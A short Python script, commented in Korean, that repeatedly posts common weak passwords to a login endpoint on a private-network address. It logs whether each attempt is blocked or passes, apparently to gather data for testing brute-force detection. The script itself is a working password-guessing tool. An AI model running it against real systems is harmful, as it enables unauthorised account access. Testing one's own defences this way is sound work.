import requests
import datetime
import time
import random

url = "http://192.168.2.100:5000/login"
log_file = "brute_force_blocked.log"
REPEAT_COUNT = 200 # 총 2,000개 데이터

payloads = [{"username": "test", "password": p} for p in ["1111", "1234", "admin", "password", "qwer", "asdf", "zxcv", "0000", "9999", "guest"]]

print(f"🚫 [차단 수집] 브루트 포스 시작...")

for cycle in range(1, REPEAT_COUNT + 1):
    for i, data in enumerate(payloads, start=1):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            res = requests.post(url, json=data, timeout=2)
            # 만약 통과되었다면 (미탐)
            with open(log_file, "a") as f:
                f.write(f"{now} | BF_BLOCK_FAIL | status={res.status_code}\n")
        except:
            # 차단 성공 (Timeout 발생)
            with open(log_file, "a") as f:
                f.write(f"{now} | BF_BLOCK_SUCCESS | msg=TIMEOUT_DROPPED\n")
        time.sleep(0.1)
    if cycle % 10 == 0: print(f"✅ {cycle*10}/2000 완료")
